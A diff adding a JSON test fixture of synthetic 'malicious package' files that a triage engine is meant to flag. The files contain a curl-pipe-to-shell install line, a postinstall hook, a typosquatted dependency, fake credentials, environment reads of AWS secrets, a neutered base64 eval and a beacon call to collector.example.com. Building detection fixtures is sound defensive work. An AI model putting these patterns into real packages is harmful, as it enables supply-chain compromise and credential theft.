@@ -1,0 +1,22 @@
+[
+ {
+  "path": "install.sh",
+  "text": "#!/usr/bin/env bash\n# SYNTHETIC FIXTURE \u2014 cleanroom test suite.\n# The piped-install line is the pattern the triage engine must flag.\n# It is never executed by the tests.\necho \"fixture installer: pattern only\"\ncurl https://get.example.com/install.sh | sh\n"
+ },
+ {
+  "path": "package.json",
+  "text": "{\n  \"name\": \"super-helper-fixture\",\n  \"version\": \"1.0.0\",\n  \"description\": \"SYNTHETIC FIXTURE for cleanroom's test suite \u2014 written so its triage rules have something real to detect. Not actual malware; nothing here genuinely attacks anything.\",\n  \"scripts\": {\n    \"postinstall\": \"node scripts/bootstrap.js\"\n  },\n  \"dependencies\": {\n    \"reqeusts\": \"^2.31.0\",\n    \"axios\": \"^1.6.0\"\n  }\n}\n"
+ },
+ {
+  "path": "requirements.txt",
+  "text": "# SYNTHETIC FIXTURE \u2014 cleanroom test suite (typosquat + decoy deps)\nreqeusts==2.31.0\nflask==3.0.0\n"
+ },
+ {
+  "path": "uploader.py",
+  "text": "\"\"\"SYNTHETIC FIXTURE \u2014 cleanroom test suite.\n\nWritten so the triage engine has real patterns to detect: credential-shaped\nstrings (all fake, generated for this fixture), dynamic execution, shell\nspawning, home-directory access and shell-profile persistence. Nothing here\nactually attacks anything, and this module is never imported by anything\nexcept the tests.\n\"\"\"\n\nimport base64\nimport os\nimport subprocess\nimport urllib.request\n\nFAKE_ACCESS_KEY = \"AKIAIOSFODNN7EXAMPLE\"          # AWS docs' canonical dummy key\nFAKE_GITHUB_TOKEN = \"ghp_FIXTURE000000000000000000000000000000\"\nauth_token = \"fixture-token-please-triage-me-before-running\"\n\nBLOB = \"VGhpcyBpcyBub3QgcmVhbCBtYWx3YXJlLiBJdCBpcyBhIHN5bnRoZXRpYyBmaXh0dXJlIHdyaXR0ZW4gZm9yIHRoZSBjbGVhbnJvb20gdGVzdCBzdWl0ZSBzbyBpdHMgZGV0ZWN0aW9uIHJ1bGVzIGhhdmUgc29tZXRoaW5nIHJlYWwgdG8gY2F0Y2guIA==VGhpcyBpcyBub3QgcmVhbCBtYWx3YXJlLiBJdCBpcyBhIHN5bnRoZXRpYyBmaXh0dXJlIHdyaXR0ZW4gZm9yIHRoZSBjbGVhbnJvb20gdGVzdCBzdWl0ZSBzbyBpdHMgZGV0ZWN0aW9uIHJ1bGVzIGhhdmUgc29tZXRoaW5nIHJlYWwgdG8gY2F0Y2guIA==\"\n\n\ndef decoy():\n    # dynamic execution of a zero-length payload: pattern present, never runs\n    payload = base64.b64decode(BLOB[:0])\n    eval(payload)  # noqa: S307 \u2014 intentional, for detection only\n    return None\n\n\ndef reads_environment():\n    return {\n        \"aws\": os.environ.get(\"AWS_SESSION_TOKEN\", \"absent\"),\n        \"path\": os.environ.get(\"PATH\", \"absent\"),\n    }\n\n\ndef shells_out():\n    subprocess.run([\"echo\", \"fixture-decoy\"], check=False)\n\n\ndef touches_home():\n    marker = os.path.expanduser(\"~/.cleanroom-fixture-marker\")\n    return marker  # returned, never written\n\n\ndef persistence_pattern():\n    # the STRING '.bashrc' appears only to exercise the persistence rule\n    return \"appends to ~/.bashrc\" if False else \"pattern only\"\n\n\ndef phones_home():\n    return urllib.request.urlopen(\"https://collector.example.com/beacon\")  # never executed\n"
+ },
+ {
+  "path": "scripts/bootstrap.js",
+  "text": "// SYNTHETIC FIXTURE \u2014 cleanroom test suite.\n// Deliberately contains the patterns the triage engine must flag:\n// an install-time hook, dynamic execution, shell spawning, env reads.\n// It does NOT actually contact any server (fetch points at a non-routable\n// documentation domain and is never executed in tests).\n\nconst { execSync } = require(\"child_process\");\n\nconst payload =\n  \"VGhpcyBpcyBub3QgcmVhbCBtYWx3YXJlLiBJdCBpcyBhIHN5bnRoZXRpYyBmaXh0dXJlIHdyaXR0ZW4gZm9yIHRoZSBjbGVhbnJvb20gdGVzdCBzdWl0ZSBzbyBpdHMgZGV0ZWN0aW9uIHJ1bGVzIGhhdmUgc29tZXRoaW5nIHJlYWwgdG8gY2F0Y2guIA==VGhpcyBpcyBub3QgcmVhbCBtYWx3YXJlLiBJdCBpcyBhIHN5bnRoZXRpYyBmaXh0dXJlIHdyaXR0ZW4gZm9yIHRoZSBjbGVhbnJvb20gdGVzdCBzdWl0ZSBzbyBpdHMgZGV0ZWN0aW9uIHJ1bGVzIGhhdmUgc29tZXRoaW5nIHJlYWwgdG8gY2F0Y2guIA==\";\n\nconst decoded = Buffer.from(payload, \"base64\").toString(\"utf-8\");\neval(decoded.slice(0, 0)); // never runs: zero-length slice, present only for detection\n\nconst who = process.env.AWS_SECRET_ACCESS_KEY || \"fixture-no-secret-here\";\nexecSync(\"echo fixture-bootstrap-ran-fine\");\n\nmodule.exports = { decoded, who };\n\nif (require.main === module) {\n  console.log(\"fixture bootstrap: detection patterns only, nothing executed\");\n}\n"
+ }
+]
